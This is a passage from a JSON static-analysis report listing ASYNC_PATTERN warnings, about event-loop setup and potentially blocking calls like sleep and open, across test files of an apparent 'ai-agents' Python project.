        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\error_handling\\test_error_recovery.py",
        "warning": "Async function network_operation may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.317644"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\error_handling\\test_error_recovery.py",
        "warning": "Async function failing_service may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.317704"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\error_handling\\test_error_recovery.py",
        "warning": "Async function fallback_handler may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.317739"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\error_handling\\test_error_recovery.py",
        "warning": "Async function primary_service may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.317821"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\error_handling\\test_error_recovery.py",
        "warning": "Async function degraded_service may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.317856"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\error_handling\\test_error_recovery.py",
        "warning": "Async function database_service may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.317916"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\error_handling\\test_error_recovery.py",
        "warning": "Async function cache_service may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.317955"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\error_handling\\test_error_recovery.py",
        "warning": "Async function api_service may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.317989"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\error_handling\\test_error_recovery.py",
        "warning": "Async function database_fallback may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.318027"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\error_handling\\test_error_recovery.py",
        "warning": "Async function cache_fallback may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.318061"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\error_handling\\test_error_recovery.py",
        "warning": "Async function api_fallback may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.318096"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\error_handling\\test_error_recovery.py",
        "warning": "Async function write_operation may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.318159"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\error_handling\\test_error_recovery.py",
        "warning": "Async function read_operation may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.318193"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\error_handling\\test_error_recovery.py",
        "warning": "Async function slow_operation may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.318259"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\error_handling\\test_error_recovery.py",
        "warning": "Async function timeout_with_fallback may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.318294"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\error_handling\\test_error_recovery.py",
        "warning": "Async function health_check_service may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.318357"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\error_handling\\test_error_recovery.py",
        "warning": "Async function monitor_system_health may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.318393"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\error_handling\\test_error_recovery.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:46.319662"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\error_handling\\test_error_recovery.py",
        "warning": "Potentially blocking call: CircuitBreakerOpenError",
        "timestamp": "2025-09-05T17:30:46.320631"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\error_handling\\test_error_recovery.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:46.321179"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\error_handling\\test_error_recovery.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:46.321325"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\error_handling\\test_error_recovery.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:46.321395"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\error_handling\\test_error_recovery.py",
        "warning": "Potentially blocking call: CircuitBreakerOpenError",
        "timestamp": "2025-09-05T17:30:46.321564"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\error_handling\\test_error_recovery.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:46.322267"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\integration\\test_phase6_component_interactions.py",
        "warning": "Potentially blocking call: open",
        "timestamp": "2025-09-05T17:30:46.338511"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\integration\\test_phase6_integration.py",
        "warning": "Potentially blocking call: open",
        "timestamp": "2025-09-05T17:30:46.356129"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\integration\\test_phase6_integration.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:46.358421"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\integration\\test_phase6_integration.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:46.358862"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\performance\\test_concurrent_operations.py",
        "warning": "Async function start_monitoring may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.377359"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\performance\\test_concurrent_operations.py",
        "warning": "Async function stop_monitoring may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.377403"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\performance\\test_concurrent_operations.py",
        "warning": "Async function _monitor_loop may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.377440"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\performance\\test_concurrent_operations.py",
        "warning": "Async function simulate_agent_task may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.377482"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\performance\\test_concurrent_operations.py",
        "warning": "Async function simulate_database_operation may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.377518"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\performance\\test_concurrent_operations.py",
        "warning": "Async function simulate_api_request may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.377556"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\performance\\test_concurrent_operations.py",
        "warning": "Async function test_concurrent_task_processing_small_load may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.377598"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\performance\\test_concurrent_operations.py",
        "warning": "Async function test_concurrent_task_processing_high_load may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.377634"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\performance\\test_concurrent_operations.py",
        "warning": "Async function test_sustained_load_performance may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.377671"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\performance\\test_concurrent_operations.py",
        "warning": "Async function test_concurrent_database_operations may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.377710"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\performance\\test_concurrent_operations.py",
        "warning": "Async function test_database_connection_pool_exhaustion may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.377747"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\performance\\test_concurrent_operations.py",
        "warning": "Async function test_api_endpoint_concurrent_requests may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.377785"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\performance\\test_concurrent_operations.py",
        "warning": "Async function test_memory_usage_under_load may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.377823"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\performance\\test_concurrent_operations.py",
        "warning": "Async function test_garbage_collection_impact may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.377860"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\performance\\test_concurrent_operations.py",
        "warning": "Async function test_cascading_failure_recovery_time may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.377899"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\performance\\test_concurrent_operations.py",
        "warning": "Async function controlled_operation may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.378151"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\performance\\test_concurrent_operations.py",
        "warning": "Async function pool_controlled_operation may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.378222"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\performance\\test_concurrent_operations.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:46.380163"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\performance\\test_concurrent_operations.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:46.380240"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\performance\\test_concurrent_operations.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:46.381203"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\performance\\test_concurrent_operations.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:46.381279"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\performance\\test_concurrent_operations.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:46.381545"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\performance\\test_concurrent_operations.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:46.381732"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\performance\\test_concurrent_operations.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:46.382700"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\performance\\test_concurrent_operations.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:46.382818"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\performance\\test_concurrent_operations.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:46.383970"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\conftest.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:46.391314"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\conftest.py",
        "warning": "Potentially blocking call: open_files",
        "timestamp": "2025-09-05T17:30:46.391753"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\run_phase7_tests.py",
        "warning": "Potentially blocking call: open",
        "timestamp": "2025-09-05T17:30:46.400713"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\run_phase7_tests.py",
        "warning": "Potentially blocking call: open",
        "timestamp": "2025-09-05T17:30:46.400752"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\run_phase7_tests.py",
        "warning": "Potentially blocking call: open",
        "timestamp": "2025-09-05T17:30:46.401974"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_autonomous_orchestration.py",
        "warning": "Async function execute_task may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.407742"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_autonomous_orchestration.py",
        "warning": "Async function improve_performance may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.407774"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_autonomous_orchestration.py",
        "warning": "Async function orchestrator may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.407801"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_autonomous_orchestration.py",
        "warning": "Async function test_orchestrator_initialization may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.407829"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_autonomous_orchestration.py",
        "warning": "Async function test_agent_registration may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.407854"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_autonomous_orchestration.py",
        "warning": "Async function test_autonomous_task_decomposition may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.407877"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_autonomous_orchestration.py",
        "warning": "Async function test_emergent_coordination_patterns may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.407900"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_autonomous_orchestration.py",
        "warning": "Async function test_autonomous_performance_optimization may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.407923"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_autonomous_orchestration.py",
        "warning": "Async function test_concurrent_autonomous_operations may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.407946"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_autonomous_orchestration.py",
        "warning": "Async function test_safety_constraint_enforcement may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.407968"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_autonomous_orchestration.py",
        "warning": "Async function test_autonomy_level_transitions may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.407990"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_autonomous_orchestration.py",
        "warning": "Async function test_capability_evolution may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.408012"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_autonomous_orchestration.py",
        "warning": "Async function coordination_system may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.408035"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_autonomous_orchestration.py",
        "warning": "Async function test_swarm_intelligence_emergence may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.408058"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_autonomous_orchestration.py",
        "warning": "Async function test_hierarchical_decision_making may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.408080"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_autonomous_orchestration.py",
        "warning": "Async function test_consensus_mechanisms may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.408103"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_autonomous_orchestration.py",
        "warning": "Async function test_conflict_resolution may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.408125"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_autonomous_orchestration.py",
        "warning": "Async function test_adaptive_coordination_patterns may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.408147"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_autonomous_orchestration.py",
        "warning": "Async function emergence_detector may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.408170"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_autonomous_orchestration.py",
        "warning": "Async function test_novel_behavior_detection may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.408192"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_autonomous_orchestration.py",
        "warning": "Async function test_behavior_cultivation may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.408216"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_autonomous_orchestration.py",
        "warning": "Async function test_emergent_capability_integration may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.408239"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_autonomous_orchestration.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:46.409108"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_causal_reasoning.py",
        "warning": "Async function causal_engine may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.419063"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_causal_reasoning.py",
        "warning": "Async function test_basic_causal_discovery may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.419105"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_causal_reasoning.py",
        "warning": "Async function test_complex_causal_network may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.419138"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_causal_reasoning.py",
        "warning": "Async function test_confounding_variable_detection may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.419168"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_causal_reasoning.py",
        "warning": "Async function test_temporal_causal_relationships may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.419197"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_causal_reasoning.py",
        "warning": "Async function intervention_engine may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.419226"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_causal_reasoning.py",
        "warning": "Async function test_do_calculus_interventions may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.419255"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_causal_reasoning.py",
        "warning": "Async function test_counterfactual_analysis may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.419284"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_causal_reasoning.py",
        "warning": "Async function test_policy_intervention_simulation may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.419313"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_causal_reasoning.py",
        "warning": "Async function test_causal_effect_attribution may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.419342"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_causal_reasoning.py",
        "warning": "Async function integrated_reasoning may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.419371"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_causal_reasoning.py",
        "warning": "Async function test_causal_reasoning_accuracy_target may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.419400"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_causal_reasoning.py",
        "warning": "Async function test_real_time_causal_inference may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.419442"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_integration.py",
        "warning": "Async function execute_complex_business_task may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.429732"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_integration.py",
        "warning": "Async function _determine_task_success may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.429769"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_integration.py",
        "warning": "Async function _calculate_quality_score may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.429797"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_integration.py",
        "warning": "Async function integrated_system may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.429846"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_integration.py",
        "warning": "Async function business_agents may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.429874"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_integration.py",
        "warning": "Async function test_95_percent_complex_task_success may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.429903"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_integration.py",
        "warning": "Async function test_end_to_end_business_workflow may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.429932"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_integration.py",
        "warning": "Async function test_adaptive_workflow_optimization may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.429960"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_integration.py",
        "warning": "Async function emergent_system may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.429989"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_integration.py",
        "warning": "Async function test_novel_capability_emergence may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.430019"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_integration.py",
        "warning": "Async function test_system_wide_capability_propagation may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.430047"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_integration.py",
        "warning": "Async function test_cost_optimization_measurement may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.430076"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_integration.py",
        "warning": "Async function test_workflow_automation_completeness may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.430105"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_integration.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:46.431407"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_integration.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:46.433436"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_performance.py",
        "warning": "Async function execute_simple_task may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.444693"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_performance.py",
